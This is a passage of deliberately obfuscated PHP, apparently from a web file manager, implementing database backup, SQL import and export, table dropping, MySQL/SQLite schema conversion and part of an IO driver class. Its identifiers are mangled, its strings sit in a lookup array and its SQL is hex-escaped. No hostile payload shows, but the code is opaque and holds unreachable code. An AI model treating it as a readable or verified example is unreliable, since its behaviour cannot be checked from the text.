$™­Â£ü³ = array_change_key_case($this->database); if ($this->dbType() == $Öİ¡ƒç[13] || !$ı–ªôô”) { return $this->model()->db(); } $Œş„¾Óº = $™­Â£ü³[$Öİ¡ƒç[1056]]; $™­Â£ü³[$Öİ¡ƒç[1056]] = $Öİ¡ƒç[12]; if ($™­Â£ü³[$Öİ¡ƒç[1051]] == $Öİ¡ƒç[1048]) { $Ü ‡™¥Ô = $™­Â£ü³[$Öİ¡ƒç[1057]]; $™­Â£ü³[$Öİ¡ƒç[1057]] = substr($Ü ‡™¥Ô, 0, strrpos($Ü ‡™¥Ô, $Öİ¡ƒç[1143])); } $this->database = $™­Â£ü³; $ã÷Â……Ö = $this->model()->db(); try { $²×ø÷îÜ = $ã÷Â……Ö->execute("\x73\150\157\x77\x20\144\x61\164\x61\142\141\163\145\163\x20\x6c\x69\153\x65\40\47{$Œş„¾Óº}\x27"); } catch (Exception $Şµ¨Š) { } if (!$²×ø÷îÜ) { $ã÷Â……Ö->execute("\143\162\145\141\x74\x65\x20\144\141\x74\141\x62\x61\163\145\x20\x60{$Œş„¾Óº}\x60"); } $™­Â£ü³[$Öİ¡ƒç[1056]] = $Œş„¾Óº; if ($™­Â£ü³[$Öİ¡ƒç[1051]] == $Öİ¡ƒç[1048]) { $™­Â£ü³[$Öİ¡ƒç[1057]] .= $Öİ¡ƒç[1143] . $Œş„¾Óº; } $this->database = $™­Â£ü³; $ã÷Â……Ö->execute("\x75\163\x65\x20\x60{$Œş„¾Óº}\140"); return $ã÷Â……Ö; } public function createTable($ï¿şåì, &$÷íÄÜ‡¯) { $ç¥Õóæù =& $_SERVER[¶Ô„œ…¯]; if (!IO::exist($ï¿şåì)) { ActionCall($ç¥Õóæù[1144], !0, 0); show_json(LNG($ç¥Õóæù[1145]), !1); } $¦¯ê¥Ï™ = $this->model()->db(); $¨²”üò¶ = sqlSplit(IO::getContent($ï¿şåì)); foreach ($¨²”üò¶ as $„×ÏÕÄÒ) { $û‡Ô”©ë = stripos($„×ÏÕÄÒ, $ç¥Õóæù[1146]) === 0; if ($û‡Ô”©ë) { $÷íÄÜ‡¯->task[$ç¥Õóæù[1147]] += 1; } $¦¯ê¥Ï™->execute($„×ÏÕÄÒ); if ($û‡Ô”©ë) { preg_match($ç¥Õóæù[1148], $„×ÏÕÄÒ, $§¼ÎÂ¹¯); $÷íÄÜ‡¯->task[$ç¥Õóæù[1149]] = $§¼ÎÂ¹¯[1]; $÷íÄÜ‡¯->update(1); } } } public function insertTable($¤“—ÚÂÎ, &$®ï£®¡½) { $ß€“­µ‘ =& $_SERVER[¶Ô„œ…¯]; $ò‚ü¹Ç€ = $this->model()->db(); $ §¿­¶Œ = $Çƒü¨ª ? array($Çƒü¨ª) : $ò‚ü¹Ç€->getTables(); foreach ($¤“—ÚÂÎ as $ä’ÉŠŠ½) { $Çƒü¨ª = basename($ä’ÉŠŠ½, $ß€“­µ‘[867]); if (!in_array($Çƒü¨ª, $ §¿­¶Œ)) { continue; } $®ï£®¡½->task[$ß€“­µ‘[1149]] = $Çƒü¨ª; if (get_filesize($ä’ÉŠŠ½) == 0) { continue; } $à£Ğ²©’ = $this->sqlToDb($ä’ÉŠŠ½, $®ï£®¡½); if (!$à£Ğ²©’) { ActionCall($ß€“­µ‘[1144], !0, 0); show_json(LNG($ß€“­µ‘[1150]) . "\x5b{$Çƒü¨ª}\x5d", !1); } } } public function sqlFromDb($¹ã­Ğú, $òÊ‹äàÇ, &$ì¯±ß­ï, $â’Ö = '') { if ($ì¯±ß­ï) { $ì¯±ß­ï->task[$_SERVER[¶Ô„œ…¯][1149]] = $¹ã­Ğú; } $´Ç¹ƒøñ = $this->model($¹ã­Ğú); $Ã™ë¢‚ = 0; $Ú˜Ù×ÆÓ = 0; $Ğï•Üã³ = 10000; $¼×–›ÍÆ = fopen($òÊ‹äàÇ, $_SERVER[¶Ô„œ…¯][1151]); $¦Ìò¸Õš = $´Ç¹ƒøñ->getPk(); $¿µµËâñ = $´Ç¹ƒøñ->getDbFields(); $Ñ­ÈÆ‰ = $_SERVER[¶Ô„œ…¯][12]; if ($GLOBALS[$_SERVER[¶Ô„œ…¯][866]] && in_array($¹ã­Ğú, array($_SERVER[¶Ô„œ…¯][1152], $_SERVER[¶Ô„œ…¯][1153]))) { $Ñ­ÈÆ‰ = $¹ã­Ğú; } do { $ë‡º½ö = array($¦Ìò¸Õš => array($_SERVER[¶Ô„œ…¯][1098], $Ú˜Ù×ÆÓ)); $’úõ­Ş† = $´Ç¹ƒøñ->where($ë‡º½ö)->field($¿µµËâñ)->order($¦Ìò¸Õš . $_SERVER[¶Ô„œ…¯][1154])->limit($Ğï•Üã³)->select(); $’úõ­Ş† = !empty($’úõ­Ş†) ? $’úõ­Ş† : array(); if (!($‡†æÕì = count($’úõ­Ş†))) { break; } $üê‹é¿ = end($’úõ­Ş†); $Ú˜Ù×ÆÓ = $üê‹é¿[$¦Ìò¸Õš]; $µÎ´úäĞ = array(); foreach ($’úõ­Ş† as $î¼»¢ÒÙ) { if ($Ñ­ÈÆ‰) { if ($¹ã­Ğú == $_SERVER[¶Ô„œ…¯][1152]) { if ($î¼»¢ÒÙ[$_SERVER[¶Ô„œ…¯][33]] == $_SERVER[¶Ô„œ…¯][1155]) { $©İ¸Š×ö = json_decode($î¼»¢ÒÙ[$_SERVER[¶Ô„œ…¯][452]], !0); if ($©İ¸Š×ö[$_SERVER[¶Ô„œ…¯][32]] == $GLOBALS[$_SERVER[¶Ô„œ…¯][866]] && $©İ¸Š×ö[$_SERVER[¶Ô„œ…¯][828]] != 1) { continue; } } } else { if ($î¼»¢ÒÙ[$_SERVER[¶Ô„œ…¯][33]] == $_SERVER[¶Ô„œ…¯][1156] && $î¼»¢ÒÙ[$_SERVER[¶Ô„œ…¯][97]] == $_SERVER[¶Ô„œ…¯][861]) { continue; } } } if ($â’Ö) { $î¼»¢ÒÙ[$_SERVER[¶Ô„œ…¯][87]] = "\173\151\x6f\x3a{$â’Ö}\175" . substr($î¼»¢ÒÙ[$_SERVER[¶Ô„œ…¯][87]], strlen("\x7b\x69\157\x3a{$î¼»¢ÒÙ[$_SERVER[¶Ô„œ…¯][896]]}\x7d")); $î¼»¢ÒÙ[$_SERVER[¶Ô„œ…¯][896]] = $â’Ö; } $µÎ´úäĞ[] = $_SERVER[¶Ô„œ…¯][1157] . $this->sqlEncode($î¼»¢ÒÙ) . $_SERVER[¶Ô„œ…¯][1158]; } $éßÅˆÍ¸ = "\x49\x4e\123\x45\122\124\40\111\116\x54\117\40\140{$¹ã­Ğú}\140\40\x28\x60" . implode($_SERVER[¶Ô„œ…¯][1159], $¿µµËâñ) . $_SERVER[¶Ô„œ…¯][1160]; fwrite($¼×–›ÍÆ, $éßÅˆÍ¸ . implode($_SERVER[¶Ô„œ…¯][1161], $µÎ´úäĞ) . $_SERVER[¶Ô„œ…¯][74] . PHP_EOL); $Ã™ë¢‚ += $‡†æÕì; if ($ì¯±ß­ï) { $ì¯±ß­ï->update($‡†æÕì); } } while ($Ğï•Üã³ == $‡†æÕì); fclose($¼×–›ÍÆ); return $Ã™ë¢‚; } public function sqlToDb($ëú©¤©‹, &$¸¸¶ë¢) { $ÈƒıÅ– =& $_SERVER[¶Ô„œ…¯]; $Øãˆü—÷ = $this->model()->db(); $êß®ÁšÚ = @fopen($ëú©¤©‹, $ÈƒıÅ–[1162]); if (!$êß®ÁšÚ) { return !1; } $›€²ï“ç = 0; $‘üõÔÏ = $ÈƒıÅ–[12]; $¸ß¾şê = array(); $¬È‰·‹ù = $this->dbType(); $…†µ®ßß = $¬È‰·‹ù == $ÈƒıÅ–[13] ? 500 : 2000; $¥àøî¦ = basename($ëú©¤©‹, $ÈƒıÅ–[867]); $è§ÖŞ = 0; $Õ¥ŒÅ = 4194304; while (!feof($êß®ÁšÚ)) { $ÚùÎªÕ¤ = trim(fgets($êß®ÁšÚ)); if (!$ÚùÎªÕ¤) { continue; } $Ä™”½î = $this->sqlDecode($ÚùÎªÕ¤, $¬È‰·‹ù, $¥àøî¦); if (stripos($Ä™”½î, $ÈƒıÅ–[432]) === 0) { if (!$‘üõÔÏ) { $‘üõÔÏ = $Ä™”½î . $ÈƒıÅ–[53]; } continue; } if ($¸¸¶ë¢) { $¸¸¶ë¢->task[$ÈƒıÅ–[1147]] += 1; } $›€²ï“ç++; $¸ß¾şê[] = rtrim(rtrim(trim($Ä™”½î), $ÈƒıÅ–[50]), $ÈƒıÅ–[74]); $ÖÏ–²’¨ = null; $ŠôÜÁ‘ô = strlen($Ä™”½î); $è§ÖŞ += $ŠôÜÁ‘ô; $ù²¾Î—ú = strlen($‘üõÔÏ) + $è§ÖŞ + (count($¸ß¾şê) - 1); if ($ù²¾Î—ú >= $Õ¥ŒÅ) { $ÖÏ–²’¨ = array_pop($¸ß¾şê); if ($›€²ï“ç > 1) { $›€²ï“ç--; } } if ($›€²ï“ç >= $…†µ®ßß || $ÖÏ–²’¨) { $Ä™”½î = $‘üõÔÏ . implode($ÈƒıÅ–[50], $¸ß¾şê); if (!$Øãˆü—÷->execute($Ä™”½î)) { return !1; } if ($¸¸¶ë¢) { $¸¸¶ë¢->update($›€²ï“ç); } $¸ß¾şê = array(); $›€²ï“ç = 0; $è§ÖŞ = 0; if ($ÖÏ–²’¨) { $¸ß¾şê = array($ÖÏ–²’¨); $›€²ï“ç = 1; $è§ÖŞ = $ŠôÜÁ‘ô; } } } fclose($êß®ÁšÚ); if (!empty($¸ß¾şê)) { $Ä™”½î = $‘üõÔÏ . implode($ÈƒıÅ–[50], $¸ß¾şê); if (!$Øãˆü—÷->execute($Ä™”½î)) { return !1; } if ($¸¸¶ë¢) { $¸¸¶ë¢->update($›€²ï“ç); } } return !0; } public function dropTable($öÛ¿¦¦µ = null) { $”…ù½¡® = $this->model()->db(); $ô«ş™Ä° = $öÛ¿¦¦µ ? array($öÛ¿¦¦µ) : $”…ù½¡®->getTables(); if (!$ô«ş™Ä°) { return; } foreach ($ô«ş™Ä° as $öÛ¿¦¦µ) { if ($öÛ¿¦¦µ) { $öÛ¿¦¦µ = strtolower($öÛ¿¦¦µ); } else { continue; } $”…ù½¡®->execute("\x64\x72\x6f\160\40\x74\141\x62\x6c\145\x20\x69\x66\x20\x65\170\151\163\x74\163\x20\x60{$öÛ¿¦¦µ}\140"); } } private function sqlEncode($õï€‘ì) { $ÙÎ¸ñ²¿ =& $_SERVER[¶Ô„œ…¯]; $Ûšµ¾ = array(); foreach ($õï€‘ì as $–ñ²÷¼›) { if (is_array($–ñ²÷¼›)) { $–ñ²÷¼› = json_encode_force($–ñ²÷¼›); } $–ñ²÷¼› = addslashes($–ñ²÷¼›); $–ñ²÷¼› = str_replace(array($ÙÎ¸ñ²¿[1163], $ÙÎ¸ñ²¿[287], $ÙÎ¸ñ²¿[419]), array($ÙÎ¸ñ²¿[1164], $ÙÎ¸ñ²¿[1165], $ÙÎ¸ñ²¿[1166]), $–ñ²÷¼›); $Ûšµ¾[] = $–ñ²÷¼›; } return $ÙÎ¸ñ²¿[58] . implode($ÙÎ¸ñ²¿[1167], $Ûšµ¾) . $ÙÎ¸ñ²¿[58]; } private function sqlDecode($ˆ®—ÈìÒ, $ò™¨ĞÀ, $¥Ò±£‰ô = '') { $İØ®åú— =& $_SERVER[¶Ô„œ…¯]; $ˆ®—ÈìÒ = str_replace(array($İØ®åú—[1164], $İØ®åú—[1165], $İØ®åú—[1166]), array($İØ®åú—[1163], $İØ®åú—[287], $İØ®åú—[419]), $ˆ®—ÈìÒ); if ($ò™¨ĞÀ == $İØ®åú—[13]) { $ˆ®—ÈìÒ = str_ireplace($İØ®åú—[1168], $İØ®åú—[59], $ˆ®—ÈìÒ); $ˆ®—ÈìÒ = stripslashes($ˆ®—ÈìÒ); } return preg_replace($İØ®åú—[1169], $İØ®åú—[12], $ˆ®—ÈìÒ); if ($ò™¨ĞÀ == $İØ®åú—[13]) { return $¥Ò±£‰ô != $İØ®åú—[860] ? stripslashes($ˆ®—ÈìÒ) : $ˆ®—ÈìÒ; } if ($¥Ò±£‰ô == $İØ®åú—[860]) { $ˆ®—ÈìÒ = str_replace($İØ®åú—[1170], $İØ®åú—[121], stripslashes($ˆ®—ÈìÒ)); } return $ˆ®—ÈìÒ; } public function getSqlFile($‘ĞŒÌº· = '') { $õ‹ñÛÎù =& $_SERVER[¶Ô„œ…¯]; $“ì‰¶ôÉ = $this->dbType(!0); $áˆñ¢å´ = CONTROLLER_DIR . "\x69\x6e\x73\x74\x61\x6c\x6c\57\x64\141\164\x61\x2f{$“ì‰¶ôÉ}\56\163\161\154"; $ìˆ‘Å½² = file_get_contents($áˆñ¢å´); $æÎ±¨…ˆ = $õ‹ñÛÎù[1171] . ($“ì‰¶ôÉ == $õ‹ñÛÎù[883] ? $õ‹ñÛÎù[1172] : $õ‹ñÛÎù[1173]) . $õ‹ñÛÎù[1174]; preg_match_all($æÎ±¨…ˆ, $ìˆ‘Å½², $Ş÷İèøö); $ÚèÒ§¸¯ = $Ş÷İèøö[1]; $Ã’…é–‹ = $this->model()->db(); $Ç¦ò³§¬ = $Ã’…é–‹->getTables(); $İïó½Ï = TEMP_FILES . $õ‹ñÛÎù[1175] . date($õ‹ñÛÎù[261]) . $õ‹ñÛÎù[8]; del_dir($İïó½Ï); mk_dir($İïó½Ï); $à†çÖó¸ = $İïó½Ï . $õ‹ñÛÎù[1176]; $‚½•Ø ¢ = $İïó½Ï . $õ‹ñÛÎù[1177]; $¯æØ¶Ş = $“ì‰¶ôÉ == $õ‹ñÛÎù[13] ? $õ‹ñÛÎù[883] : $õ‹ñÛÎù[13]; IO::copy(CONTROLLER_DIR . "\151\156\163\164\141\154\154\x2f\144\141\164\x61\57{$¯æØ¶Ş}\56\163\x71\154", $İïó½Ï); @touch($İïó½Ï . $“ì‰¶ôÉ . $õ‹ñÛÎù[867]); $õàÅ¯ª = fopen($à†çÖó¸, $õ‹ñÛÎù[1151]); $‡·»Ÿ à = fopen($‚½•Ø ¢, $õ‹ñÛÎù[1151]); if ($“ì‰¶ôÉ == $õ‹ñÛÎù[13]) { $Ç¦ò³§¬ = array_diff($Ç¦ò³§¬, array($õ‹ñÛÎù[858], $õ‹ñÛÎù[859])); $±İÇÖ‘ô = array($õ‹ñÛÎù[1178], $õ‹ñÛÎù[1179], $õ‹ñÛÎù[1180]); fwrite($‡·»Ÿ à, implode(PHP_EOL, $±İÇÖ‘ô) . PHP_EOL . PHP_EOL); foreach ($Ç¦ò³§¬ as $éÁÔ³ò­) { $‰°Ã¯Æ‡ = $this->sqlFromSqlite($éÁÔ³ò­); if (!$‰°Ã¯Æ‡[$õ‹ñÛÎù[13]]) { continue; } fwrite($‡·»Ÿ à, $‰°Ã¯Æ‡[$õ‹ñÛÎù[13]] . PHP_EOL . PHP_EOL); if (!in_array($éÁÔ³ò­, $ÚèÒ§¸¯)) { fwrite($õàÅ¯ª, $‰°Ã¯Æ‡[$õ‹ñÛÎù[883]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Ç¦ò³§¬ as $éÁÔ³ò­) { $‰°Ã¯Æ‡ = $this->sqlFromMysql($éÁÔ³ò­); if (!$‰°Ã¯Æ‡[$õ‹ñÛÎù[883]]) { continue; } fwrite($õàÅ¯ª, $‰°Ã¯Æ‡[$õ‹ñÛÎù[883]] . PHP_EOL . PHP_EOL); if (!in_array($éÁÔ³ò­, $ÚèÒ§¸¯)) { fwrite($‡·»Ÿ à, $‰°Ã¯Æ‡[$õ‹ñÛÎù[13]] . PHP_EOL . PHP_EOL); } } } fclose($õàÅ¯ª); fclose($‡·»Ÿ à); $ìˆ‘Å½² = array($õ‹ñÛÎù[883] => $à†çÖó¸, $õ‹ñÛÎù[13] => $‚½•Ø ¢); return $‘ĞŒÌº· ? $ìˆ‘Å½²[$‘ĞŒÌº·] : $ìˆ‘Å½²; } public function dbType($¶‰ë¬·¤ = false) { $É²“ø° =& $_SERVER[¶Ô„œ…¯]; $Ñ»îÔ†ì = $¶‰ë¬·¤ ? $GLOBALS[$É²“ø°[6]][$É²“ø°[21]] : $this->database; $Ñ»îÔ†ì = array_change_key_case($Ñ»îÔ†ì); $‘ÈÍ¹ê = $Ñ»îÔ†ì[$É²“ø°[1051]]; if ($‘ÈÍ¹ê == $É²“ø°[1048]) { $‰…ÏÎ¶œ = explode($É²“ø°[4], $Ñ»îÔ†ì[$É²“ø°[1057]]); $‘ÈÍ¹ê = $‰…ÏÎ¶œ[0]; } $ŸÁ˜±òî = array($É²“ø°[1181] => $É²“ø°[13], $É²“ø°[996] => $É²“ø°[883]); if (isset($ŸÁ˜±òî[$‘ÈÍ¹ê])) { $‘ÈÍ¹ê = $ŸÁ˜±òî[$‘ÈÍ¹ê]; } return $‘ÈÍ¹ê; } public function sqlFromMysql($‚“üò×Ó, $¤ÖÄ÷¹“ = '') { $ğèÈªò =& $_SERVER[¶Ô„œ…¯]; $Ó£Ô¿Ûã = $this->model()->db(); $Óì€íŞì = $Ó£Ô¿Ûã->query($ğèÈªò[1182] . $‚“üò×Ó . $ğèÈªò[463]); if (!$Óì€íŞì || !$Óì€íŞì[0]) { return !1; } $¶˜Ü¶¡Ã = _get($Óì€íŞì[0], $ğèÈªò[1183], $ğèÈªò[12]); if (!$¶˜Ü¶¡Ã) { return !1; } $êåáÁÚ— = "\104\x52\117\120\x20\x54\101\x42\x4c\105\40\111\106\40\x45\130\111\123\124\123\40\x60{$‚“üò×Ó}\x60\x3b" . PHP_EOL . $¶˜Ü¶¡Ã . $ğèÈªò[74]; if ($¤ÖÄ÷¹“ && $¤ÖÄ÷¹“ == $ğèÈªò[883]) { return $êåáÁÚ—; } $Õ›Ó²‚ï = array_change_key_case($GLOBALS[$ğèÈªò[6]][$ğèÈªò[21]]); $‹ÄîÁãÛ = $Õ›Ó²‚ï[$ğèÈªò[1056]]; $¥Èîéå = $ğèÈªò[1184] . $‹ÄîÁãÛ . $ğèÈªò[1185] . $‚“üò×Ó . $ğèÈªò[58]; $§Î«™”– = $ğèÈªò[1186] . $‚“üò×Ó . $ğèÈªò[984]; $³äê×½Ø = $Ó£Ô¿Ûã->query($¥Èîéå); if (empty($³äê×½Ø)) { $Ë¶ÇÊ÷ = array($ğèÈªò[883] => $ğèÈªò[12], $ğèÈªò[13] => $ğèÈªò[12]); return $¤ÖÄ÷¹“ ? $Ë¶ÇÊ÷[$¤ÖÄ÷¹“] : $Ë¶ÇÊ÷; } $ÕÌÁŸ«È = $Ó£Ô¿Ûã->query($§Î«™”–); $ïÛ×¤£ = $ğèÈªò[12]; $øê¿ø× = array(); foreach ($ÕÌÁŸ«È as $êú–ûñ) { if (!$ïÛ×¤£ && $êú–ûñ[$ğèÈªò[1187]] == $ğèÈªò[1188]) { $ïÛ×¤£ = $êú–ûñ[$ğèÈªò[1189]]; } if (isset($øê¿ø×[$êú–ûñ[$ğèÈªò[1187]]])) { $øê¿ø×[$êú–ûñ[$ğèÈªò[1187]]][$ğèÈªò[1190]][] = $êú–ûñ[$ğèÈªò[1189]]; continue; } $øê¿ø×[$êú–ûñ[$ğèÈªò[1187]]] = array($ğèÈªò[1191] => $êú–ûñ[$ğèÈªò[1187]], $ğèÈªò[1190] => array($êú–ûñ[$ğèÈªò[1189]]), $ğèÈªò[1192] => $êú–ûñ[$ğèÈªò[1193]] == $ğèÈªò[91] ? 0 : 1); } $Áï«Ê¬† = array(); foreach ($øê¿ø× as $êú–ûñ) { $œã‡Û‚ç = $êú–ûñ[$ğèÈªò[1191]] == $ğèÈªò[1188]; $ı®±Â³Õ = array($ğèÈªò[1194], $êú–ûñ[$ğèÈªò[1192]] == $ğèÈªò[91] && !$œã‡Û‚ç ? $ğèÈªò[1195] : $ğèÈªò[12], $ğèÈªò[1196], $ğèÈªò[1197] . $‚“üò×Ó . $ğèÈªò[11] . ($œã‡Û‚ç ? $ğèÈªò[1198] : $êú–ûñ[$ğèÈªò[1191]]) . $ğèÈªò[121], $ğèÈªò[1199], $ğèÈªò[121] . $‚“üò×Ó . $ğèÈªò[121], $ğèÈªò[1200] . implode($ğèÈªò[1201], $êú–ûñ[$ğèÈªò[1190]]) . $ğèÈªò[1202]); $Áï«Ê¬†[] = implode($ğèÈªò[53], $ı®±Â³Õ) . $ğèÈªò[74]; } $©‡ÃÕ„û = array(); $ùÙ¾› = array($ğèÈªò[1203] => $ğèÈªò[1204], $ğèÈªò[1204] => $ğèÈªò[1204], $ğèÈªò[365] => $ğèÈªò[392], $ğèÈªò[364] => $ğèÈªò[392]); foreach ($³äê×½Ø as $êú–ûñ) { $ı®±Â³Õ = array($ğèÈªò[121] . $êú–ûñ[$ğèÈªò[1205]] . $ğèÈªò[121], isset($ùÙ¾›[$êú–ûñ[$ğèÈªò[1206]]]) ? $ùÙ¾›[$êú–ûñ[$ğèÈªò[1206]]] : $êú–ûñ[$ğèÈªò[1207]], $êú–ûñ[$ğèÈªò[1208]] == $ğèÈªò[982] ? $ğèÈªò[1209] : $ğèÈªò[1210], $êú–ûñ[$ğèÈªò[1205]] == $ïÛ×¤£ ? $ğèÈªò[1211] : $ğèÈªò[12], $êú–ûñ[$ğèÈªò[1033]] ? strtoupper(str_replace($ğèÈªò[11], $ğèÈªò[12], $êú–ûñ[$ğèÈªò[1033]])) : $ğèÈªò[12]); $©‡ÃÕ„û[] = trim(implode($ğèÈªò[53], $ı®±Â³Õ)); } $ğèï˜ë„ = array($ğèÈªò[1212] . $‚“üò×Ó . $ğèÈªò[1213], $ğèÈªò[1214] . $‚“üò×Ó . $ğèÈªò[1215], implode($ğèÈªò[50] . PHP_EOL, $©‡ÃÕ„û), $ğèÈªò[1030]); $ßç¼•¶— = implode(PHP_EOL, array_merge($ğèï˜ë„, $Áï«Ê¬†)); if ($¤ÖÄ÷¹“ && $¤ÖÄ÷¹“ == $ğèÈªò[13]) { return $ßç¼•¶—; } $Ë¶ÇÊ÷ = array($ğèÈªò[883] => $êåáÁÚ—, $ğèÈªò[13] => $ßç¼•¶—); return $¤ÖÄ÷¹“ ? $Ë¶ÇÊ÷[$¤ÖÄ÷¹“] : $Ë¶ÇÊ÷; } public function sqlFromSqlite($ª¢¾õ…Ğ, $ş¾ïİƒ = '') { $‘Ş¾æ²› =& $_SERVER[¶Ô„œ…¯]; $šşÁ³È³ = $this->model()->db(); $âŞ•õñ© = "\120\122\x41\x47\x4d\101\x20\124\x41\x42\114\x45\137\x49\x4e\106\x4f\x20\50\47{$ª¢¾õ…Ğ}\x27\51"; $İÆ²ùò„ = "\x53\x45\114\105\103\124\40\x2a\40\106\122\117\115\40\x73\161\154\151\164\x65\x5f\x6d\x61\163\164\x65\162\40\x57\x48\x45\122\x45\x20\164\142\154\x5f\x6e\x61\x6d\x65\40\x3d\40\47{$ª¢¾õ…Ğ}\x27"; $ËÙ¹øï¶ = $šşÁ³È³->query($âŞ•õñ©); if (empty($ËÙ¹øï¶)) { $Ñ÷à¦‚¸ = array($‘Ş¾æ²›[883] => $‘Ş¾æ²›[12], $‘Ş¾æ²›[13] => $‘Ş¾æ²›[12]); return $ş¾ïİƒ ? $Ñ÷à¦‚¸[$ş¾ïİƒ] : $Ñ÷à¦‚¸; } $óÂú©Ñ = $šşÁ³È³->query($İÆ²ùò„); $´§ñ¦•ö = $ö’Õ®ıÓ = array(); foreach ($óÂú©Ñ as $×Õà„ºÉ) { if ($×Õà„ºÉ[$‘Ş¾æ²›[33]] == $‘Ş¾æ²›[358]) { $´§ñ¦•ö[] = $×Õà„ºÉ[$‘Ş¾æ²›[1216]]; } else { $ö’Õ®ıÓ[$×Õà„ºÉ[$‘Ş¾æ²›[32]]] = $×Õà„ºÉ[$‘Ş¾æ²›[1216]]; } } $¯÷áª = array_merge(array($‘Ş¾æ²›[1212] . $ª¢¾õ…Ğ . $‘Ş¾æ²›[121]), $´§ñ¦•ö, array_values($ö’Õ®ıÓ)); $¯÷áª = implode($‘Ş¾æ²›[74] . PHP_EOL, $¯÷áª) . $‘Ş¾æ²›[74]; if ($ş¾ïİƒ && $ş¾ïİƒ == $‘Ş¾æ²›[13]) { return $¯÷áª; } $åìÒáŒ¨ = array(); foreach ($ö’Õ®ıÓ as $³§öÃøø => $’ş¤¢Á‘) { $éúöùºí = str_replace($‘Ş¾æ²›[1217] . $ª¢¾õ…Ğ . $‘Ş¾æ²›[11], $‘Ş¾æ²›[12], $³§öÃøø); $éúöùºí = str_replace($ª¢¾õ…Ğ . $‘Ş¾æ²›[11], $‘Ş¾æ²›[12], $³§öÃøø); $Úã›€ı« = str_replace(array($‘Ş¾æ²›[121], $‘Ş¾æ²›[1041]), $‘Ş¾æ²›[463], substr($’ş¤¢Á‘, stripos($’ş¤¢Á‘, $‘Ş¾æ²›[339]))); $åìÒáŒ¨[$éúöùºí] = $Úã›€ı«; } $ôâŞëôú = array(); $·ßÈëÄÄ = array($‘Ş¾æ²›[1204] => $‘Ş¾æ²›[1218], $‘Ş¾æ²›[392] => $‘Ş¾æ²›[1219]); $˜¬«‰¶ò = $çïä”€› = $‘Ş¾æ²›[12]; foreach ($ËÙ¹øï¶ as $×Õà„ºÉ) { if ($×Õà„ºÉ[$‘Ş¾æ²›[57]] == $‘Ş¾æ²›[91]) { $˜¬«‰¶ò = $×Õà„ºÉ[$‘Ş¾æ²›[32]]; } $Ğ¢£œÆš = $×Õà„ºÉ[$‘Ş¾æ²›[33]]; if ($Ğ¢£œÆš == $‘Ş¾æ²›[1220] && isset($åìÒáŒ¨[$×Õà„ºÉ[$‘Ş¾æ²›[32]]])) { $Ğ¢£œÆš = $‘Ş¾æ²›[1221]; } $Â¥ó×‰½ = array($‘Ş¾æ²›[463] . $×Õà„ºÉ[$‘Ş¾æ²›[32]] . $‘Ş¾æ²›[463], _get($·ßÈëÄÄ, $Ğ¢£œÆš, $Ğ¢£œÆš), $×Õà„ºÉ[$‘Ş¾æ²›[35]] == $‘Ş¾æ²›[91] ? $‘Ş¾æ²›[1209] : $‘Ş¾æ²›[1222] . $×Õà„ºÉ[$‘Ş¾æ²›[56]], $×Õà„ºÉ[$‘Ş¾æ²›[57]] == $‘Ş¾æ²›[91] ? $‘Ş¾æ²›[1223] : $‘Ş¾æ²›[12]); $ôâŞëôú[] = trim(implode($‘Ş¾æ²›[53], $Â¥ó×‰½)); } foreach ($åìÒáŒ¨ as $éúöùºí => $Úã›€ı«) { if ($éúöùºí == $‘Ş¾æ²›[1198]) { $øø˜¨şˆ = $çïä”€› = $‘Ş¾æ²›[1224] . $˜¬«‰¶ò . $‘Ş¾æ²›[1225]; } else { $øø˜¨şˆ = (stripos($éúöùºí, $‘Ş¾æ²›[11]) ? $‘Ş¾æ²›[1226] : $‘Ş¾æ²›[12]) . ($‘Ş¾æ²›[1227] . $éúöùºí . $‘Ş¾æ²›[1228] . $Úã›€ı«); } $ôâŞëôú[] = $øø˜¨şˆ; } if ($˜¬«‰¶ò && !$çïä”€›) { $ôâŞëôú = array_merge(array($‘Ş¾æ²›[1224] . $˜¬«‰¶ò . $‘Ş¾æ²›[1225]), $ôâŞëôú); } $…æˆŒ§ = array($‘Ş¾æ²›[1229] . $ª¢¾õ…Ğ . $‘Ş¾æ²›[1230], $‘Ş¾æ²›[1231] . $ª¢¾õ…Ğ . $‘Ş¾æ²›[1232], implode($‘Ş¾æ²›[50] . PHP_EOL, $ôâŞëôú), $‘Ş¾æ²›[1233]); $Šà¸Í¡‹ = implode(PHP_EOL, $…æˆŒ§); if ($ş¾ïİƒ && $ş¾ïİƒ == $‘Ş¾æ²›[883]) { return $Šà¸Í¡‹; } $Ñ÷à¦‚¸ = array($‘Ş¾æ²›[883] => $Šà¸Í¡‹, $‘Ş¾æ²›[13] => $¯÷áª); return $ş¾ïİƒ ? $Ñ÷à¦‚¸[$ş¾ïİƒ] : $Ñ÷à¦‚¸; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Ê™¶˜ğı, $Å£ªúä¼) { $ë•ˆşÅ =& $_SERVER[¶Ô„œ…¯]; $ŒÅ¸« = $Å£ªúä¼; $GLOBALS[$ë•ˆşÅ[1234]] = $ë•ˆşÅ[1235] . $Ê™¶˜ğı; Hook::trigger($ë•ˆşÅ[1235] . $Ê™¶˜ğı . $ë•ˆşÅ[1236], $ŒÅ¸«); $¤ÅÔêéã = self::driverMake($Å£ªúä¼[0]); if (!$¤ÅÔêéã) { return !1; } if (method_exists($¤ÅÔêéã, $Ê™¶˜ğı)) { $€¯Î¿Şš = @call_user_func_array(array($¤ÅÔêéã, $Ê™¶˜ğı), $Å£ªúä¼); } else { if (method_exists($¤ÅÔêéã, $ë•ˆşÅ[1237])) { $€¯Î¿Şš = @call_user_func_array(array($¤ÅÔêéã, $Ê™¶˜ğı), $Å£ªúä¼); } else { if (method_exists(self, $Ê™¶˜ğı)) { $€¯Î¿Şš = @call_user_func_array(array(self, $Ê™¶˜ğı), $Å£ªúä¼); } else { $€¯Î¿Şš = call_user_func_array(array(parent, $Ê™¶˜ğı), $Å£ªúä¼); } } } Hook::trigger($ë•ˆşÅ[1235] . $Ê™¶˜ğı . $ë•ˆşÅ[1238], $ŒÅ¸«, $€¯Î¿Şš); return $€¯Î¿Şš; } public static function init($–ÊÖ”ªî) { return self::driverMake($–ÊÖ”ªî); } public static function copy($üÊÓ÷ì, $öá‘í…å, $–ºÔ±ı = false, $†¸Š…ñ× = false) { return self::copyMoveStart($üÊÓ÷ì, $öá‘í…å, $–ºÔ±ı, $_SERVER[¶Ô„œ…¯][623], $†¸Š…ñ×); } public static function move($ï¹ËùØ, $™‰åîÄê, $ÈÄ³‡ƒœ = false, $æã´ÏÖ = false) { return self::copyMoveStart($ï¹ËùØ, $™‰åîÄê, 